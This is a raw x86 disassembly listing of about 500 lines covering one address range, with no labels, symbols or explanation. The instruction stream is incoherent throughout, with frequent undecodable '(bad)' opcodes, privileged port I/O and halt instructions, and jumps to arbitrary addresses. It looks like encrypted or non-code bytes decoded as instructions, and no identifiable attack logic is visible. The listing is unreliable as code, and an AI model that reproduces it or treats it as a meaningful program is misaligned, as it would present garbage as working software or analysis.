  403a1f:	add    esi,DWORD PTR [ebp-0x64]
  403a22:	cmp    bl,dl
  403a24:	into   
  403a25:	jmp    0x9fa757e
  403a2a:	mov    ah,0xce
  403a2c:	arpl   WORD PTR [ebp+0x7],dx
  403a2f:	cmp    eax,0x4acbe463
  403a34:	ds push ecx
  403a36:	push   ebx
  403a37:	stos   DWORD PTR es:[edi],eax
  403a38:	pusha  
  403a39:	xchg   DWORD PTR [edx-0x58],ebx
  403a3c:	dec    ecx
  403a3d:	mov    ecx,0x4009ad82
  403a42:	mov    ebx,0x73976b08
  403a47:	push   ds
  403a48:	mov    edx,DWORD PTR [eax-0x7f838f25]
  403a4e:	sti    
  403a4f:	ds add al,0xb9
  403a52:	push   ecx
  403a53:	jns    0x403ab1
  403a55:	out    0x47,al
  403a57:	push   ss
  403a58:	mov    edx,0xdb58f762
  403a5d:	(bad)  
  403a5e:	inc    ebx
  403a5f:	mov    esi,0x5cdcf8e1
  403a64:	push   ss
  403a65:	jle    0x4039ee
  403a67:	cmc    
  403a68:	inc    eax
  403a69:	add    BYTE PTR [eax+0x45],0xc5
  403a6d:	sahf   
  403a6e:	rcl    DWORD PTR [ebx+0x6f1b41f0],cl
  403a74:	mov    ch,0xe8
  403a76:	sbb    al,0x2d
  403a78:	mov    ch,0x7a
  403a7a:	jno    0x403aa8
  403a7c:	les    edx,FWORD PTR [ebx+ebp*8]
  403a7f:	xchg   DWORD PTR [esi+0x3bc0fab1],eax
  403a85:	call   0x972e601c
  403a8a:	imul   ebp,DWORD PTR [eax+0x411143d7],0xa3996af4
  403a94:	dec    ebx
  403a95:	mov    esp,0x87a8e5ef
  403a9a:	sbb    cl,BYTE PTR [edi-0x12133c96]
  403aa0:	mov    eax,0x25c86ea9
  403aa5:	in     eax,0xcb
  403aa7:	xchg   esi,eax
  403aa8:	jmp    0x403a3b
  403aaa:	lock adc al,0xf5
  403aad:	inc    ebp
  403aae:	mov    ds:0xcbf4580c,al
  403ab3:	nop
  403ab4:	pop    esi
  403ab5:	dec    ebp
  403ab6:	pop    ebp
  403ab7:	inc    ecx
  403ab8:	cmc    
  403ab9:	inc    DWORD PTR [ecx+ebx*1+0x46]
  403abd:	aad    0x31
  403abf:	popf   
  403ac0:	mov    eax,ds:0x2801290f
  403ac5:	aam    0xb2
  403ac7:	or     DWORD PTR [ebx+0x4b],0x7e
  403acb:	xchg   ebx,eax
  403acc:	(bad)  
  403acd:	jecxz  0x403b34
  403acf:	cmp    eax,0xff9f1ce3
  403ad4:	lds    esp,FWORD PTR [ecx-0x18414ca]
  403ada:	loope  0x403b20
  403adc:	retf   0xa8ed
  403adf:	(bad)  [eax]
  403ae1:	adc    al,0xe5
  403ae3:	and    DWORD PTR [esi+0x9d0d4a1],ebp
  403ae9:	stc    
  403aea:	gs test eax,0xb2943eb2
  403af0:	adc    al,0x9d
  403af2:	jo     0x403b52
  403af4:	sub    al,0xa7
  403af6:	and    BYTE PTR [eax-0x2ef38ba2],dl
  403afc:	rcl    esi,0x29
  403aff:	jl     0x403abc
  403b01:	fimul  DWORD PTR [esi]
  403b03:	dec    ebx
  403b04:	hlt    
  403b05:	and    ch,dl
  403b07:	sbb    al,0xe2
  403b09:	adc    ah,bh
  403b0b:	ds dec ebx
  403b0d:	xor    BYTE PTR [eax+0x28a0fb5b],0xd8
  403b14:	cdq    
  403b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b16:	test   eax,0x9b398011
  403b1b:	punpcklwd mm3,mm4
  403b1e:	daa    
  403b1f:	jge    0x403b35
  403b21:	dec    esi
  403b22:	sub    dl,ch
  403b24:	(bad)  
  403b25:	xlat   BYTE PTR ds:[ebx]
  403b26:	xchg   ecx,eax
  403b27:	add    ecx,DWORD PTR [eax+eax*1]
  403b2a:	jp     0x403b5a
  403b2c:	push   edx
  403b2d:	rcr    esp,0x50
  403b30:	sahf   
  403b31:	inc    eax
  403b32:	adc    DWORD PTR [ebp-0x65c551d0],esi
  403b38:	out    dx,al
  403b39:	lea    edx,[ebx-0x324f1528]
  403b3f:	mov    dl,BYTE PTR [ecx-0x1]
  403b42:	cmp    BYTE PTR [edi-0x1c],bl
  403b45:	(bad)  
  403b46:	loop   0x403b6b
  403b48:	or     BYTE PTR [ecx-0x44fb505a],ch
  403b4e:	outs   dx,BYTE PTR ds:[esi]
  403b4f:	das    
  403b50:	add    al,0x57
  403b52:	jb     0x403ba5
  403b54:	in     eax,0xb1
  403b56:	(bad)  
  403b57:	or     ch,dh
  403b59:	cmp    edx,DWORD PTR [ebx-0x6a7b5e31]
  403b5f:	lock mov al,0xb5
  403b62:	bswap  esi
  403b64:	aam    0x47
  403b66:	popf   
  403b67:	pop    ds
  403b68:	lock iret 
  403b6a:	cli    
  403b6b:	clc    
  403b6c:	sub    al,BYTE PTR [edi-0x2d]
  403b6f:	test   DWORD PTR [esi+esi*8],esi
  403b72:	scas   al,BYTE PTR es:[edi]
  403b73:	pop    edi
  403b74:	sti    
  403b75:	xor    BYTE PTR [ebx-0x74c1dffb],ch
  403b7b:	pop    ecx
  403b7c:	mov    edi,0x6b7e29b0
  403b81:	and    edx,ebx
  403b83:	fnstsw WORD PTR [ebp+0x6f]
  403b86:	push   0x2c5e498d
  403b8b:	or     BYTE PTR [ebx+0x55],0x8e
  403b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b90:	cdq    
  403b91:	arpl   WORD PTR ss:[eax-0x667adb48],dx
  403b98:	mov    ah,0x98
  403b9a:	mov    gs,WORD PTR [ebx]
  403b9c:	sub    al,0xcf
  403b9e:	pop    ds
  403b9f:	cmp    edx,DWORD PTR [ecx+0x36b9c98b]
  403ba5:	aad    0x4f
  403ba7:	jnp    0x403bc0
  403ba9:	enter  0x71d5,0x3c
  403bad:	pop    ebp
  403bae:	xor    eax,0x983010fc
  403bb3:	pusha  
  403bb4:	pop    edx
  403bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bb6:	inc    esi
  403bb7:	add    ebp,DWORD PTR [edx]
  403bb9:	pop    ecx
  403bba:	data16 adc al,0x21
  403bbd:	js     0x403c0e
  403bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc1:	add    al,0xe
  403bc3:	mov    al,ds:0x4afaaa1d
  403bc8:	imul   ebx,ebp,0x59
  403bcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bcc:	(bad)  
  403bcd:	jnp    0x403c27
  403bcf:	(bad)  
  403bd0:	das    
  403bd1:	xor    eax,0x12b03d26
  403bd6:	retf   0xb3df
  403bd9:	in     eax,dx
  403bda:	or     al,BYTE PTR cs:[ebp+0x54e69840]
  403be1:	dec    ebx
  403be2:	stc    
  403be3:	les    edi,FWORD PTR [ebx+0x6e7c5d75]
  403be9:	jecxz  0x403be0
  403beb:	sbb    edi,esi
  403bed:	aas    
  403bee:	add    al,0x3e
  403bf0:	dec    edi
  403bf1:	test   DWORD PTR [eax+ebp*1+0x53ad546a],ebp
  403bf8:	fld    QWORD PTR [ecx-0x75]
  403bfb:	mov    eax,ds:0xdb46d23b
  403c00:	icebp  
  403c01:	push   ebx
  403c02:	dec    BYTE PTR [eax-0x698a24f]
  403c08:	fstp   st(2)
  403c0a:	or     eax,0x935b4cce
  403c0f:	daa    
  403c10:	pusha  
  403c11:	and    ch,BYTE PTR es:[esi+0x647a6249]
  403c18:	out    0xa6,al
  403c1a:	push   ebp
  403c1b:	addr16 std 
  403c1d:	mov    al,ds:0xe9e93b0e
  403c22:	push   ebx
  403c23:	(bad)  
  403c24:	jno    0x403c7e
  403c26:	ja     0x403c26
  403c28:	or     al,0x97
  403c2a:	ret    0x2a07
  403c2d:	ja     0x403be9
  403c2f:	fidivr DWORD PTR [esi-0x2b5eeb47]
  403c35:	dec    esi
  403c36:	mov    ebx,0x8c36ac9
  403c3b:	inc    esi
  403c3c:	mov    al,ds:0xb8546c07
  403c41:	or     eax,0xc63aee84
  403c46:	rcl    ch,1
  403c48:	mov    ?,edi
  403c4a:	out    0x4,eax
  403c4c:	mov    eax,ebp
  403c4e:	jno    0x403c80
  403c50:	jae    0x403cc5
  403c52:	loopne 0x403c19
  403c54:	xchg   DWORD PTR [edi],ebp
  403c56:	scas   eax,DWORD PTR es:[edi]
  403c57:	dec    esp
  403c58:	xor    eax,0xcf86be81
  403c5d:	test   eax,0x1e4b2f16
  403c62:	(bad)  
  403c63:	jae    0x403cb3
  403c65:	nop
  403c66:	fstp   TBYTE PTR [edx+eiz*1-0x5c]
  403c6a:	retf   
  403c6b:	mov    eax,0xf5b581ff
  403c70:	cmp    eax,0x78cc2016
  403c75:	sub    edi,edi
  403c77:	(bad)  
  403c78:	mov    bl,0xe4
  403c7a:	sbb    dh,ch
  403c7c:	jo     0x403cec
  403c7e:	(bad)  
  403c7f:	ficomp DWORD PTR [eax+0x44]
  403c82:	test   eax,0xd58c64e2
  403c87:	push   es
  403c88:	repz pop ds
  403c8a:	add    BYTE PTR [ebx+0x448a8fc2],bh
  403c90:	sub    eax,0x76c827ce
  403c95:	lds    ecx,FWORD PTR [bx+di]
  403c98:	shr    DWORD PTR [ebx],1
  403c9a:	iret   
  403c9b:	cmp    eax,0x90a2d335
  403ca0:	sbb    BYTE PTR ds:0xf68df580,dl
  403ca6:	push   es
  403ca7:	inc    esp
  403ca8:	cmp    edi,DWORD PTR [eax-0x7e]
  403cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cac:	mov    eax,ds:0x56bf3bbc
  403cb1:	aaa    
  403cb2:	(bad)  
  403cb3:	out    dx,eax
  403cb4:	retf   
  403cb5:	fidiv  DWORD PTR [eax+0x52]
  403cb8:	xor    bl,BYTE PTR [eax-0x65]
  403cbb:	pushf  
  403cbc:	push   ebp
  403cbd:	stc    
  403cbe:	mov    bh,0xb9
  403cc0:	outs   dx,BYTE PTR ds:[esi]
  403cc1:	shl    DWORD PTR [ebx-0x2ce82cbb],1
  403cc7:	pop    eax
  403cc8:	pop    ecx
  403cc9:	mov    eax,0x670498e5
  403cce:	jne    0x403cce
  403cd0:	popf   
  403cd1:	out    0x7d,al
  403cd3:	jne    0x403ce5
  403cd5:	sub    eax,0xfc90f352
  403cda:	add    DWORD PTR [eax],eax
  403cdc:	xchg   esp,eax
  403cdd:	ficomp DWORD PTR [edi+0x7b3770c0]
  403ce3:	xchg   eax,ebx
  403ce5:	pop    eax
  403ce6:	mov    dh,0x8c
  403ce8:	dec    esp
  403ce9:	mov    ds:0xaaa79a22,eax
  403cee:	dec    edx
  403cef:	mov    al,ds:0xcf75ea45
  403cf4:	inc    esp
  403cf5:	repnz test eax,0x9ee6ffa8
  403cfb:	or     cl,ch
  403cfd:	cli    
  403cfe:	mov    edx,0xbdd1ed13
  403d03:	xchg   BYTE PTR [edi-0x4ef86d36],dl
  403d09:	xor    eax,0x41684e2
  403d0e:	xor    edx,esp
  403d10:	aad    0x69
  403d12:	stc    
  403d13:	lods   eax,DWORD PTR ds:[esi]
  403d14:	(bad)  
  403d15:	pop    edi
  403d16:	pop    ss
  403d17:	mov    bh,0xec
  403d19:	or     BYTE PTR [esi+edx*8],dl
  403d1c:	and    DWORD PTR cs:[ecx+0x79e7984e],edi
  403d23:	xor    eax,0x673523bd
  403d28:	jmp    0x403d77
  403d2a:	sti    
  403d2b:	in     eax,0xc8
  403d2d:	daa    
  403d2e:	pop    ecx
  403d2f:	test   al,0xdd
  403d31:	jns    0x403d88
  403d33:	sub    DWORD PTR [esi+0xf855fdd],edi
  403d39:	dec    ebp
  403d3a:	outs   dx,BYTE PTR ds:[esi]
  403d3b:	(bad)  
  403d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d3d:	lds    ecx,FWORD PTR [edi+0x1b]
  403d40:	mov    ebx,0xfec36ef8
  403d45:	add    DWORD PTR [esi+0x1a6324d9],0x940bfa21
  403d4f:	dec    esi
  403d50:	xchg   ecx,eax
  403d51:	jge    0x403cda
  403d53:	push   ecx
  403d54:	mov    bl,0xf6
  403d56:	xor    dh,BYTE PTR [esi+0x153f510c]
  403d5c:	inc    esi
  403d5d:	aaa    
  403d5e:	or     BYTE PTR [ebp-0x1f],ah
  403d61:	pop    ebp
  403d62:	cwde   
  403d63:	in     eax,dx
  403d64:	pop    es
  403d65:	sub    dl,0x2a
  403d68:	sbb    al,0x23
  403d6a:	push   ebp
  403d6b:	rcr    BYTE PTR [ebx],cl
  403d6d:	push   ss
  403d6e:	test   eax,0x89ad0a1
  403d73:	pushf  
  403d74:	out    dx,al
  403d75:	xor    al,0xc8
  403d77:	inc    eax
  403d78:	xchg   ebx,eax
  403d79:	test   eax,0x89e777b2
  403d7e:	jbe    0x403dae
  403d80:	and    ebx,DWORD PTR [ecx]
  403d82:	sub    eax,0x87d86409
  403d87:	out    0xee,eax
  403d89:	cmp    al,0x53
  403d8b:	mov    cs:0xce7e3e4c,eax
  403d91:	nop
  403d92:	mov    ds:0x4fa4b391,al
  403d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d98:	push   0xffffffb6
  403d9a:	inc    esp
  403d9b:	(bad)  
  403d9c:	ins    BYTE PTR es:[edi],dx
  403d9d:	jne    0x403d41
  403d9f:	mov    edi,0xb711a9ba
  403da4:	xchg   DWORD PTR [eax-0x34],esp
  403da7:	pop    ebx
  403da8:	add    al,BYTE PTR [esi]
  403daa:	or     eax,DWORD PTR [ebp-0x17634da1]
  403db0:	jno    0x403df0
  403db2:	js     0x403da1
  403db4:	repnz rol BYTE PTR [ebp-0x2b0c55cd],0x9
  403dbc:	pop    ebp
  403dbd:	sub    eax,0x54ad3a46
  403dc2:	jb     0x403dbe
  403dc4:	xor    DWORD PTR [edi],edi
  403dc6:	and    bh,BYTE PTR [ebx]
  403dc8:	cld    
  403dc9:	sbb    ebp,ebp
  403dcb:	jmp    0x403d7b
  403dcd:	or     ecx,DWORD PTR [eax*4+0x42a5ca6d]
  403dd4:	cli    
  403dd5:	inc    ecx
  403dd6:	int3   
  403dd7:	in     eax,dx
  403dd8:	je     0x403e2d
  403dda:	push   ebx
  403ddb:	mov    al,0xbd
  403ddd:	xor    BYTE PTR [eax],0x9d
  403de0:	repz test BYTE PTR [ecx],al
  403de3:	jae    0x403e0b
  403de5:	mov    ebx,0x219e51d4
  403dea:	(bad)  
  403deb:	and    esp,DWORD PTR [eax]
  403ded:	loope  0x403de4
  403def:	sub    eax,0x45a487d4
  403df4:	push   eax
  403df5:	(bad)  
  403df6:	loopne 0x403dba
  403df8:	pop    ebx
  403df9:	xchg   edi,eax
  403dfa:	and    al,0x2c
  403dfc:	stos   DWORD PTR es:[edi],eax
  403dfd:	stc    
  403dfe:	stos   DWORD PTR es:[edi],eax
  403dff:	clc    
  403e00:	(bad)  
  403e01:	push   0x77
  403e03:	push   esi
  403e04:	jbe    0x403dba
  403e06:	aam    0xa3
  403e08:	mov    ah,0x6f
  403e0a:	sbb    BYTE PTR [esi+ebx*2],dh
  403e0d:	mov    bh,0x58
  403e0f:	(bad)  
  403e10:	lods   eax,DWORD PTR ds:[esi]
  403e11:	iret   
  403e12:	jmp    0x403e6c
  403e14:	and    BYTE PTR [eax],al
  403e16:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e18:	or     eax,0x2655c909
  403e1d:	pusha  
  403e1e:	xchg   DWORD PTR [esi+ebx*1],esp
  403e21:	push   cs
  403e22:	dec    edi
  403e23:	pop    ds
  403e24:	sbb    BYTE PTR [ebp+0x62a44bd9],dl
  403e2a:	sub    al,0x87
  403e2c:	or     al,0xd9
  403e2e:	mov    al,ds:0xf1c4bb0f
  403e33:	lock or eax,0x89e928ff
  403e39:	sub    esi,DWORD PTR [eax]
  403e3b:	(bad)  
  403e3c:	call   0xb42460b3
  403e41:	fst    QWORD PTR [esi+0x1cd231bf]
  403e47:	enter  0x894e,0xbf
  403e4b:	ins    DWORD PTR es:[edi],dx
  403e4c:	rol    DWORD PTR [eax-0x4e],1
  403e4f:	fnsave [ebp+0x1714ca86]
  403e55:	add    eax,0x528a0b34
  403e5a:	ins    BYTE PTR es:[edi],dx
  403e5b:	xor    DWORD PTR [edx+0x413a52a6],esp
  403e61:	mov    dh,0xf7
  403e63:	ds inc ebx
  403e65:	fst    DWORD PTR [ecx]
  403e67:	pop    esi
  403e68:	or     ch,ch
  403e6a:	or     esi,0x16
  403e6d:	nop
  403e6e:	sbb    eax,0x180196ad
  403e73:	repz push esp
  403e75:	cmp    ebx,DWORD PTR [esi+eiz*4+0x887c752]
  403e7c:	hlt    
  403e7d:	ins    BYTE PTR es:[edi],dx
  403e7e:	jmp    0x403ecf
  403e80:	sbb    esp,DWORD PTR [ebx]
  403e82:	mov    al,ds:0x41c3fc4e
  403e87:	aam    0x85
  403e89:	lahf   
  403e8a:	rcl    DWORD PTR [edi+0x5e6031af],1
  403e90:	add    eax,0xa7b30e8a
  403e95:	mov    ch,dh
  403e97:	enter  0xbf23,0x9a
  403e9b:	enter  0x5d61,0x8e
  403e9f:	jge    0x403e6b
  403ea1:	mov    ebx,0x72c6107b
  403ea6:	xchg   edx,eax
  403ea7:	sub    DWORD PTR [edx-0x54],esi
  403eaa:	pop    ebx
  403eab:	sbb    ecx,ebx
  403ead:	push   ds
  403eae:	cmp    bl,bl
  403eb0:	and    eax,0x11fe3785
  403eb5:	scas   eax,DWORD PTR es:[edi]
  403eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eb7:	mov    bl,0xf9
  403eb9:	fild   DWORD PTR [eax+ebx*4+0x4d]
  403ebd:	shl    BYTE PTR [eax],0xd7
  403ec0:	rcr    DWORD PTR ds:0xcadf5d64,0xab
  403ec7:	xchg   esi,eax
  403ec8:	fadd   QWORD PTR [ebx+edx*4]
  403ecb:	push   cs
  403ecc:	dec    BYTE PTR [edi+0x53]
  403ecf:	and    BYTE PTR [ecx],ch
  403ed1:	adc    al,0x50
  403ed3:	jle    0x403ec6
  403ed5:	sbb    DWORD PTR [esi-0x6b],eax
  403ed8:	scas   eax,DWORD PTR es:[edi]
  403ed9:	(bad)  
  403eda:	inc    DWORD PTR [edi-0x12d3a2dd]
  403ee0:	sti    
  403ee1:	pop    ebp
  403ee2:	mov    dl,0xf9
  403ee4:	ret    
  403ee5:	aad    0xfd
  403ee7:	imul   edi,DWORD PTR [ebx+0x443e197b],0x374da197
  403ef1:	mov    eax,ds:0x63bc27a4
  403ef6:	add    esi,eax
  403ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ef9:	ins    DWORD PTR es:[edi],dx
  403efa:	fdiv   QWORD PTR [edx]
  403efc:	sbb    al,0xfa
  403efe:	jle    0x403f17
  403f00:	call   0x4be4bb11
  403f05:	lds    ecx,FWORD PTR [ecx+0x5834927]
  403f0b:	mov    cl,0xe
  403f0d:	dec    eax
  403f0e:	adc    ah,al
  403f10:	push   ss
  403f11:	es pop ebx
  403f13:	mov    cs,WORD PTR [ebx-0x11]
  403f16:	mov    ah,0x1c
  403f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f19:	outs   dx,DWORD PTR ds:[esi]
  403f1a:	call   FWORD PTR [edx+0x79]
  403f1d:	hlt    
  403f1e:	xchg   edx,eax
  403f1f:	fwait
  403f20:	jl     0x403f94
  403f22:	addr16 or al,0xcf
  403f25:	test   BYTE PTR [esi-0x28],al
  403f28:	fucom  st(1)
  403f2a:	(bad)  
  403f2b:	xlat   BYTE PTR ds:[ebx]
  403f2c:	dec    edx
  403f2d:	xlat   BYTE PTR ds:[ebx]
  403f2e:	cmp    al,0xf3
  403f30:	test   al,0xbc
  403f32:	adc    DWORD PTR [edx],ecx
  403f34:	xor    eax,0xba3932f7
  403f39:	sub    cl,BYTE PTR [ebx+0x67]
  403f3c:	aad    0xe2
  403f3e:	iret   
  403f3f:	cmp    bl,dl
  403f41:	jns    0x403f41
  403f43:	and    BYTE PTR [edi+edi*1-0x4165adb],bl
  403f4a:	mov    esi,DWORD PTR [esi+eiz*1+0x30]
  403f4e:	pop    ebp
  403f4f:	cwde   
  403f50:	or     bh,dh
  403f52:	in     eax,dx
  403f53:	xor    ebp,DWORD PTR [ebx-0x31]
  403f56:	mov    cl,0x3
  403f58:	das    
  403f59:	pop    edx
  403f5a:	(bad)  
  403f5b:	dec    esp
  403f5c:	xor    ebx,DWORD PTR [ecx-0x36d54a31]
  403f62:	xchg   esp,eax
  403f63:	imul   eax,DWORD PTR [esi+0x44],0xffffffd7
  403f67:	and    dh,al
  403f69:	repz loope 0x403fd9
  403f6c:	stos   BYTE PTR es:[edi],al
  403f6d:	add    al,0x52
  403f6f:	cli    
  403f70:	(bad)  
  403f73:	pop    ecx
  403f74:	dec    ebx
  403f75:	imul   edx,DWORD PTR [eax+0x37],0x3c
  403f79:	dec    edi
  403f7a:	cmc    
  403f7b:	or     BYTE PTR [edx+0x19],bl
  403f7e:	adc    BYTE PTR [eax],dh
  403f80:	jne    0x403f0c
  403f82:	push   0xffffffc8
  403f84:	jb     0x403f7a
  403f86:	mov    bl,0x87
  403f88:	retf   0x2744
  403f8b:	stos   BYTE PTR es:[edi],al
  403f8c:	pushf  
  403f8d:	gs leave 
  403f8f:	fisttp QWORD PTR [edx+0x21]
  403f92:	inc    esi
  403f93:	sbb    BYTE PTR [ebp+0x449244e],bh
  403f99:	imul   eax,DWORD PTR [ebx-0x4f],0x2c
  403f9d:	ja     0x403fc6
  403f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa0:	sbb    eax,DWORD PTR [si]
  403fa3:	in     eax,dx
  403fa4:	add    eax,0xedf433c5
  403fa9:	pop    edi
  403faa:	int3   
  403fab:	adc    DWORD PTR [edx+0x1b11fd16],ebx
  403fb1:	lods   al,BYTE PTR ds:[esi]
  403fb2:	addr16 mov ds:0x5068,eax
  403fb6:	jge    0x404030
  403fb8:	fnstenv [edi+0x3e]
  403fbb:	in     al,0x3d
  403fbd:	jecxz  0x403f44
  403fbf:	jl     0x403fc7
  403fc1:	jmp    0x404009
  403fc3:	xor    al,0xb3
  403fc5:	mov    gs,WORD PTR [esi+0x5f]
  403fc8:	inc    eax
  403fc9:	or     dl,bl
  403fcb:	add    DWORD PTR [ebp+0x5e72e867],esp
  403fd1:	js     0x403fb8
  403fd3:	xchg   esi,eax
  403fd4:	xlat   BYTE PTR ds:[ebx]
  403fd5:	pop    es
  403fd6:	cs repz mov ecx,0xe5e1c3a3
  403fdd:	adc    al,0x32
  403fdf:	push   0x5a1e80df
  403fe4:	mov    al,ds:0x9dd80881
  403fe9:	out    0x36,al
  403feb:	repnz mov dh,0xb6
  403fee:	pusha  
  403fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff0:	ror    BYTE PTR [ecx+eiz*2],cl
  403ff3:	and    DWORD PTR [ebx+0x2],0xffffffc7
  403ff7:	cmp    al,0x83
  403ff9:	and    al,0xc3
  403ffb:	movups XMMWORD PTR [ecx-0x2392035a],xmm0
  404002:	je     0x403fa3
  404004:	out    dx,al
  404005:	xchg   ecx,eax
  404006:	push   edi
  404007:	mov    esi,0xefae403a
  40400c:	pop    edx
  40400d:	xor    BYTE PTR [edi+0x70c9d90d],ch
  404013:	mov    ds:0xbfdeab98,eax
  404018:	dec    ebp
  404019:	xlat   BYTE PTR ds:[ebx]
  40401a:	jl     0x404004
  40401c:	mov    edi,0x18320e78
  404021:	dec    esp
  404022:	shl    ch,1
  404024:	sar    BYTE PTR [ecx-0xba1894c],cl
  40402a:	sub    ch,ch
  40402c:	sbb    BYTE PTR [edx],bh
  40402e:	out    0x7b,al
  404030:	jne    0x404072
  404032:	inc    BYTE PTR [ebp-0x1b4d9e71]
  404038:	sbb    ch,BYTE PTR [ebx-0x3d]
  40403b:	jnp    0x4040bc
  40403d:	adc    eax,0x16f597bc
  404042:	cmp    bl,al
  404044:	and    al,0x39
  404046:	jle    0x403fe5
  404048:	xor    ch,dl
  40404a:	lock mov cs,WORD PTR [ecx+0x2a4d98c8]
  404051:	rol    DWORD PTR [esi],1
  404053:	loopne 0x4040ad
  404055:	jp     0x403fdb
  404057:	xchg   ebp,eax
  404058:	ins    BYTE PTR es:[edi],dx
  404059:	ja     0x404099
  40405b:	retf   
  40405c:	nop
  40405d:	mov    esi,0x145c8fd2
  404062:	sub    BYTE PTR ds:0x32315eb9,ch
  404068:	or     eax,0x25d48923
  40406d:	dec    ebp
  40406e:	inc    ebp
  40406f:	or     ebp,DWORD PTR [ebx]
  404071:	clc    
  404072:	sbb    eax,0xbfa3f6b2
  404077:	cmp    edi,DWORD PTR [esi-0x1ded56de]
  40407d:	cmp    DWORD PTR [ecx],esi
  40407f:	lock fsubr st(3),st
  404082:	(bad)  
  404083:	je     0x40409c
  404085:	or     cl,BYTE PTR [edi+edi*8+0x35bfb2cd]
  40408c:	jne    0x404052
  40408e:	pop    esp
  40408f:	mov    ch,0xfb
  404091:	sbb    eax,0xc74422b2
  404096:	gs sub al,ah
  404099:	xchg   BYTE PTR [edx-0x5c],ah
  40409c:	test   al,0x54
  40409e:	ret    0x1b07
  4040a1:	pop    ebx
  4040a2:	add    bl,cl
  4040a4:	enter  0xe1b,0x93
  4040a8:	mov    bh,0x1d
  4040aa:	int3   
  4040ab:	(bad)  
  4040ac:	mov    ch,0x23
  4040ae:	cmc    
  4040af:	outs   dx,DWORD PTR ds:[esi]
  4040b0:	push   0x7a
  4040b2:	enter  0xd52f,0xbc
  4040b6:	daa    
  4040b7:	std    
  4040b8:	push   ecx
  4040b9:	adc    BYTE PTR cs:[edi+0xc1da5a6],ch
  4040c0:	mov    ah,BYTE PTR [ecx]
  4040c2:	sub    esp,DWORD PTR [esi+0x56]
  4040c5:	xchg   edx,eax
  4040c6:	adc    edx,DWORD PTR ds:0xaf4e6106
  4040cc:	test   al,0x25
  4040cf:	imul   BYTE PTR [edx-0xced2d07]
  4040d5:	popf   
  4040d6:	out    0x5c,eax
  4040d8:	inc    edi
  4040d9:	sub    al,0x8c
  4040db:	mov    eax,DWORD PTR [ecx-0x335cb0d7]
  4040e1:	or     dh,BYTE PTR [eax-0x5c3934e7]
  4040e7:	xchg   ecx,eax
  4040e8:	shl    DWORD PTR [ecx+0x36],1
  4040eb:	enter  0x6ae,0x48
  4040ef:	push   ebp
  4040f0:	adc    al,0x9
  4040f2:	mov    cl,0x7f
  4040f4:	sbb    esp,edi
  4040f6:	cs push ebx
  4040f8:	fst    DWORD PTR [esi+0x11]
  4040fb:	gs hlt 
  4040fd:	sub    ch,0xa4
  404100:	sbb    esp,DWORD PTR [ebx]
  404102:	lea    edi,[ecx+0x481b9b4]
  404108:	data16 mov ds:0xa98d45de,al
  40410e:	mov    dh,0x52
  404110:	xchg   edx,eax
  404111:	pop    edx
  404112:	pop    esp
  404113:	mov    edi,0x4e577a37
  404118:	ja     0x4040c2
  40411a:	jmp    edi
  40411c:	adc    DWORD PTR [eax+0x12ce4dd1],esp
  404122:	push   esi
  404123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404124:	sub    ecx,DWORD PTR [ebx-0x58]
  404127:	(bad)  
  404128:	push   ebx
  404129:	adc    cl,bl
  40412b:	push   cs
  40412c:	mov    ch,0x24
  40412e:	mov    al,ds:0xe987f65a
  404133:	dec    edi
  404134:	sbb    BYTE PTR [ebx-0x6ed6b049],0x68
  40413b:	pop    edx
  40413c:	sub    ecx,DWORD PTR [ebp-0x44]
  40413f:	sub    ebp,DWORD PTR [edx+0x2c93f137]
  404145:	pop    edi
  404146:	test   BYTE PTR [edx],0xe7
  404149:	mov    cl,0xb7
  40414b:	mov    cl,0xba
  40414d:	hlt    
  40414e:	xor    BYTE PTR [ebp+ebx*1-0x6f],ch
  404152:	(bad)  
  404153:	jle    0x4041ab
  404155:	adc    eax,DWORD PTR [ebp-0x67]
  404158:	cmp    DWORD PTR [esp+ecx*1+0x71],0xffffff95
  40415d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40415e:	sbb    dh,BYTE PTR [edi]
  404160:	loop   0x404162
  404162:	enter  0x1d2c,0xfc
  404166:	xchg   edi,eax
  404167:	(bad)  
  404168:	shl    edi,cl
  40416a:	(bad)  
  40416b:	(bad)  
  40416c:	and    al,0x29
  40416e:	xchg   edi,eax
  40416f:	jbe    0x4041c1
  404171:	or     ch,BYTE PTR [ebx+0x37]
  404174:	push   0xb265b1db
  404179:	adc    DWORD PTR [edi+0x63ce06c1],edi
  40417f:	call   0x5a0f:0x34ac8b46
  404186:	and    eax,0x4df43e37
  40418b:	scas   eax,DWORD PTR es:[edi]
  40418c:	stos   DWORD PTR es:[edi],eax
  40418d:	jle    0x4041c6
  40418f:	xor    BYTE PTR [ebp+0x2d],0xb2
  404193:	test   eax,0xf9a95fa9
  404198:	sbb    edx,DWORD PTR [ecx]
  40419a:	xor    eax,0xf4540736
  40419f:	popf   
  4041a0:	dec    ebx
  4041a1:	loopne 0x404210
  4041a3:	mov    ds:0xf296ef4,eax
  4041a8:	pop    eax
  4041a9:	adc    dl,al
  4041ab:	jmp    0x2b5dc88a
  4041b0:	cwde   
  4041b1:	jbe    0x4041b9
  4041b3:	enter  0x7402,0xaa
  4041b7:	int    0x54
  4041b9:	fdiv   st(2),st
  4041bb:	loope  0x40416e
  4041bd:	mov    dl,BYTE PTR [ebx-0x6a843ebb]
  4041c3:	imul   edi,DWORD PTR [eax-0x492b54a1],0x809a2d7
  4041cd:	fs push ds
  4041cf:	loope  0x4041e8
  4041d1:	or     cl,BYTE PTR [esi]
  4041d3:	repnz xchg edx,eax
  4041d5:	inc    ecx
  4041d6:	sar    DWORD PTR [esi],0x71
  4041d9:	xchg   ebx,eax
  4041da:	push   esi
